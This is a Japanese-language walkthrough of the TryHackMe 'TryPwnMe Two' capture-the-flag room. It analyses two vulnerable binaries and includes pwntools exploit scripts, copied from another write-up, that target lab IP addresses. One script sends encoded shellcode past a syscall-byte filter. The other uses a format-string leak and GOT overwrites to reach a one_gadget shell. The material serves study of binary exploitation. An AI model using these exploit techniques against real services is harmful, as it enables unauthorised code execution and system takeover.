# TryPwnMe Two

https://tryhackme.com/room/trypwnmetwo

## TryExecMe 2

```c
undefined8 main(void)
{
  char cVar1;
  code *__buf;

  setup();
  banner();
  __buf = (code *)mmap((void *)0xcafe0000,100,7,0x22,-1,0);
  puts("\nGive me your spell, and I will execute it: ");
  read(0,__buf,0x80);
  puts("\nExecuting Spell...\n");
  cVar1 = forbidden(__buf);
  if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  (*__buf)();
  return 0;
}

undefined8 forbidden(long param_1)

{
  ulong local_18;

  local_18 = 0;
  while( true ) {
    if (0x7e < local_18) {
      return 0;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '\x05'))
    {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '4')) {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80))
    break;
    local_18 = local_18 + 1;
  }
  puts("Forbidden spell detected!");
  return 1;
}
```

3 種類のシェルコードが禁止されている。これにより、単純に /bin/sh を実行するようなシェルコードは成功しないと思われる。

- \x0f\x05 syscall 命令 システムコール（例：execve など）
- \x0f\x34 sysenter 命令 古い Linux カーネル向けシステムコール
- \xcd\x80（= -0x33 と-0x80） int 0x80 命令 もっと古い Linux システムコール

```shell
$ pwn checksec ./tryexecme2
[*] '/home/kali/CTF/0429/materials-trypwnmetwo/TryExecMe2/tryexecme2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

ギブアップ。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/

- 特定のバイト値を含まないようにシェルコードを生成することが可能。
- xor, rol, decoder stub などのテクニックで自己復号する形になっている。
- 今回のフィルタリングでは \x0f, \xcd の 2 文字を避ければ十分。

```python
>>> from pwn import *
>>> shellcode = asm(shellcraft.sh())
... encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")
...
>>> print(encoded_shellcode)
b'\xd9\xd0\xfc\xd9t$\xf4^\x83\xc6\x18\x89\xf7\xac\x93\xac(\xd8\xaa\x80\xeb\xacu\xf5\x8a\xf4d\xcc4\x9c\xe7\x16\xe7\x16\xa4\xd3\xb5(/\x97Eth\xca$\x8d\xf5cp\xf9\x18\xfb\xebS\x9d\x9e|}\x93\x94\x1d\x1e\xefpa\x95\x126\x1b\x8d\xd9BWX\xa4\xa5\xf5&\xb0y\xfcM\xa0\n\xa9\xad\xa6\xffkl8\x19]\xae\x9c%\xfd\xdeIz\xd4\xa6\x83\xed\x86\x91\x07_i6\xefo\xac\x00'
```

```sh
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.10.66.255", 5002)

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Encode the shellcode to avoid 0x0f and 0xcd
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")

r.recvuntil(b"Give me your spell, and I will execute it: \n")
r.sendline(encoded_shellcode)
r.interactive("$ ")
```

## Not Specified 2

```sh
$ ls
ld-linux-x86-64.so.2  libc.so.6  notspecified2
```

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("Please provide your username:");
  read(0,local_218,0x200);
  printf("Thanks ");
  printf(local_218);
  FUN_004010c0(0x539);
  return;
}

void FUN_004010c0(int param_1)
{
                    /* WARNING: Subroutine does not return */
  exit(param_1);
}
```

- 文字列フォーマット脆弱性がある
- FUN_004010c0 関数の中で exit を実行している

```sh
$ pwn checksec ./notspecified2
[*] '/home/kali/ctf/pwnme2/materials-trypwnmetwo/NotSpecified2/notspecified2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

GOT(exit)を、シェル起動の libc ガジェットアドレスに書き換える方針。  
それには 1 回目のペイロードで libc のベースアドレスを特定し、2 回目のペイロードで GOT(exit)にガジェットアドレスをセットする必要があるが、ユーザー入力は 1 回しかない。

そのため、1 回目のペイロードでは、libc のベースアドレス特定と同時に、GOT(exit)に main 関数のアドレスをセットする必要がある。No PIE 設定で main 関数のアドレスが固定のため、この方法が可能になる。

```sh
$ python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,20)]))"
ABCDEFGH|1:%p|2:%p|3:%p|4:%p|5:%p|6:%p|7:%p|8:%p|9:%p|10:%p|11:%p|12:%p|13:%p|14:%p|15:%p|16:%p|17:%p|18:%p|19:%p
```

```sh
Please provide your username:
Thanks ABCDEFGH|1:0x7fffffffb950|2:(nil)|3:0x7ffff7d14a37|4:0x7|5:0x7ffff7fc9040|6:0x4847464544434241|7:0x3a327c70253a317c|8:0x7c70253a337c7025|9:0x253a357c70253a34|10:0x377c70253a367c70|11:0x70253a387c70253a|12:0x30317c70253a397c|13:0x253a31317c70253a|14:0x7c70253a32317c70|15:0x34317c70253a3331|16:0x253a35317c70253a|17:0x7c70253a36317c70|18:0x38317c70253a3731|19:0x253a39317c70253a

pwndbg> vmmap libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
          0x404000           0x405000 rw-p     1000   5000 notspecified2
►   0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 libc.so.6
►   0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 libc.so.6
►   0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 libc.so.6
►   0x7ffff7e15000     0x7ffff7e19000 r--p     4000 214000 libc.so.6
►   0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000 218000 libc.so.6
    0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000      0 [anon_7ffff7e1b]


pwndbg> p/x 0x7ffff7d14a37 - 0x7ffff7c00000
$2 = 0x114a37
```

- 入力バッファは 6 番目に対応している。これを GOT の上書きに使える。
- 3 番目に libc 内のアドレスが出ている。これをもとに libc のベースアドレスを計算できる。

```sh
$ one_gadget ./libc.so.6
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

※最初の 2 つは OK だが、残りは機能しなかった。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/ のコード。

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./notspecified2", checksec=False)

r = remote("10.10.8.174", 5000)

# Leak an address from libc
payload = b"%3$pBBBB"

# Overwrite the last two bytes of exit@got.plt (0x401070) with \x12\x80
# This redirects execution to 0x401280 (address of main)
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)

# Parse the leaked address and calculate libc base
libc_leak = int(r.recvuntil(b"BBBB").split(b" ")[1][:-4], 16)
libc_base = libc_leak - 0x114a37

# Overwrite the GOT entry for exit with a one-gadget RCE
payload = fmtstr_payload(6, {binary.got["exit"]: libc_base + 0xebcf5})

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)
r.recv()
r.interactive("$ ")
```

2 回目のペイロードで GOT をガジェットアドレスに書き換えている部分は分かるが、1 回目の main 関数のアドレスに書き換えている部分が難解。

### 何をしているのか？

```python
# Overwrite the last two bytes of exit@got.plt (0x401070) with \x12\x80
# This redirects execution to 0x401280 (address of main)
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)
```

前半と後半に分解して考える。

```
printf("......%11$hhn", p64(binary.got["exit"]))
```

は、got["exit"] のアドレス（printf 第 11 引数として渡す）に、"%11$hhn"以前に出力した文字数の下位 1 バイト書き込む。

`"%3$pBBBB"`の部分の数え方は、8 バイトではなく、`0x7ffff7d14a37` の 14 バイト + 4 バイト = 18 バイト。  
また、`%110x`は 110 バイト。
したがって、18 + 110 = 128（0x80）が、got["exit"] のアドレスに書き込まれる。

同様に、

```
printf("......%12$hhn", p64(binary.got["exit"]+1))
```

の部分は、128 + 146 = 274（0x112）の下位 1 バイトである 0x12 を、got["exit"]+1 のアドレスに書き込んでいる。

### なぜ 11 番目と 12 番の引数を指定しているのか？

```c
payload = b"%3$pBBBB"
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
```

この時点で、payload は次の内容になっている。

```
%3$pBBBB%110x%11$hhn%146c%12$hhnAAAAAAAA
```

この長さは 40 バイト。  
x64 Linux アセンブリでは、第 6 引数までがレジスタ、第 7 引数以降がスタックになる。  
printf 呼び出しで 8 バイトプッシュされていることを考慮して、7，8，9，10 引数のそれぞれ 8 バイトずつ足すと、計 40 バイト。  
したがって、この文字列の直後は第 11 引数として扱われる。

その証拠に、末尾 8 バイトの AAAAAAAA を除去すると、第 10、第 11 引数指定でエクスプロイトが成功することを確認できる。

```python
payload += b"%110x%10$hhn%146c%11$hhn"
```
